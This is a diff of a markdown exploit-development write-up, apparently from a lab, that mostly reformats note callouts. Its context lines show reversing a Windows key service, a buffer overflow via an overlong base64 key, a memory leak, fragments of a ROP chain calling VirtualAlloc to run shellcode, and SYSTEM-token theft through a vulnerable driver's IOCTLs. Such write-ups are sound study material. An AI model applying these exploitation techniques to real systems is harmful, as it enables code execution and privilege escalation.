@@ -107,7 +107,7 @@ dev_keysvc.exe: PE32+ executable (console) x86-64, for MS Windows, 7 sections
 
 Nothing surprising here.
 
-> [!NOTE]
+> **NOTE**
 >
 > The **HTTPS** service had the default **IIS** webpage. Yes I know I could have fuzzed it, but we all know I have the exploitable binary!
 >
@@ -198,7 +198,7 @@ By connecting to the service, examining the flow in **IDA**, and sending it diff
 
 There was two functions being called that I needed to reverse engineer (three if I include the second function in Option 2). A master of reverse engineering I am not. This, as always, was going to be painful!
 
-> [!NOTE]
+> **NOTE**
 >
 > `Checksum`, `CheckKeyFile`, and `Another` are names I gave the functions I discovered whilst reversing in **IDA**. 
 
@@ -236,7 +236,7 @@ Valid key format
 
 # Vulnerability Hunting
 
-> [!NOTE]
+> **NOTE**
 >
 > As I was looking for vulnerabilities I was using a combination of dynamic and static analysis, observing the service behaviour and pulling my hair out. I have documented my understanding of the vulnerabilities discovered and some of the things I did to discover them.
 
@@ -264,7 +264,7 @@ dev_keysvc+0x11ca:
 
 All dynamic analysis I carried out from this point forward involved setting a valid key, then activiating the key via a **netcat** connection.
 
-> [!IMPORTANT]
+> **IMPORTANT**
 >
 > It is important to note that all keys are **base64** decoded in memory. It will become clear why this is important in the next section. Essentially, anything I wanted copied in to memory needed to be **base64** encoded in my 'payload'.
 
@@ -308,7 +308,11 @@ da 0000004e`9f9fe750
 
 There is nothing groundbreaking here, but it confirms where data is being copied from, to, and how big the copy is.
 
-I carried out the same test but with a longer key of **100-FE9A1-500-A270-0102-QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ**:
+I carried out the same test but with a longer key of:
+
+```
+**100-FE9A1-500-A270-0102-QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ**:
+```
 
 ```
 0:008> da rdx
@@ -654,7 +658,7 @@ I now had a memory leak of `00007FF7AEFC0660`. I calculated the offset of the me
 Evaluate expression: 132704 = 00000000`00020660
 ```
 
-> [!TIP]
+> **TIP**
 >
 > What I learned from this exercise is that sometimes you don't have to spend a lot of time statically reverse engineering assembly code, such as the checksum instructions. By observing general purpose registers during dynamic analysis this gave me the information I needed.
 
@@ -763,7 +767,7 @@ LPVOID VirtualAlloc(
 );
 ```
 
-> [!NOTE]
+> **NOTE**
 >
 > The Microsoft documentation states that `VirutalAlloc` "Reserves, commits, or **changes** the state of a region of pages in the virtual address space of the calling process. Memory allocated by this function is automatically initialized to zero".
 >
@@ -777,7 +781,7 @@ KERNEL32!VirtualAllocStub:
 00007ffa`090d3bf0 48ff2531110700  jmp     qword ptr [KERNEL32!_imp_VirtualAlloc (00007ffa`09144d28)]
 ```
 
-> [!TIP]
+> **TIP**
 >
 > A technique I have used often, when there is no entry in the IAT, is to find an instruction in the binary that makes a call to the Win32 API and dereference the memory offset that contains the address made by the call.
 
@@ -810,7 +814,7 @@ To locate usable gadgets I used the **notepadd++** application; I searched using
 
 I spent several hours looking for decent ROP gadgets to build a chain that would change the page protection on the stack to `PAGE_EXECUTE_READWRITE`. I would then drop some shellcode on the stack and execute it. When I build ROP chains it takes a lot of effort, it's a bit like starting to build a jigsaw but later finding the pieces that did fit, no longer fit and you have to take a few steps back quite often to reach your goal. I have only documented the final ROP chain.
 
-> [!IMPORTANT]
+> **IMPORTANT**
 >
 > The order in which I populated the general purpose registers for the `VirtualAlloc` call is very important. Some ROP gadgets corrupt other registers as a residual consequence, and some are quite useful in moving values into other registers.
 
@@ -853,7 +857,7 @@ buffer += pack("<Q", base_address + 0x1f90)         # mov r9, rbx ; mov r8, 0x00
 buffer += b"B" * 0x8                                # padding for add rsp, 0x08
 ```
 
-> [!NOTE]
+> **NOTE**
 >
 > Another residual consequence of this gadget is `add rsp 0x08`. I needed to make sure I padded the stack whenever I saw this instruction.
 
@@ -883,7 +887,7 @@ buffer += b"B" * 0x28                               # padding for add rsp, 0x28
 # rax contains the address of VirtualAlloc
 ```
 
-> [!NOTE]
+> **NOTE**
 >
 > Notice the padding that is required as a consequence of the `add rsp, 0x28` instruction.
 
@@ -1109,7 +1113,7 @@ To analyse a driver I first needed to find the following:
 
 I downloaded the driver binary file and loaded it in to IDA for analysis, I located the `DriverEntry` function and looked for a function that called `IoCreateDevice`.
 
-> [!NOTE]
+> **NOTE**
 >
 > The `IoCreateDevice` routine creates a device object for use by a driver.
 
@@ -1178,7 +1182,7 @@ These conditional branches look like three different IOCTL numbers are being com
 0x8000200b
 ```
 
-> [!NOTE]
+> **NOTE**
 >
 > I/O control codes (IOCTLs) are used for communication between user-mode applications and drivers, or for communication internally among drivers in a stack.
 
@@ -1216,7 +1220,7 @@ Upon analysing the code it looked like the call was:
 PVOID pAddress = ExAllocatePoolWithTag(NonPagedPool, 0x20, 0x70616552);
 ```
 
-> [!NOTE]
+> **NOTE**
 >
 > System memory allocated with the **NonPagedPool** pool type is executable.
 
@@ -1610,7 +1614,7 @@ I then used the arbitrary read primitive to get the actual address of the `SYSTE
 
 I used a token offset for the target operating system to locate the address of the `SYSTEM` token on line `14`.
 
-> [!TIP]
+> **TIP**
 >
 > The `_EPROCESS` structure can be examined using the `dt nt!_EPROCESS <address>` command in **WinDbg** to find the offset of various fields, including the security token.
 
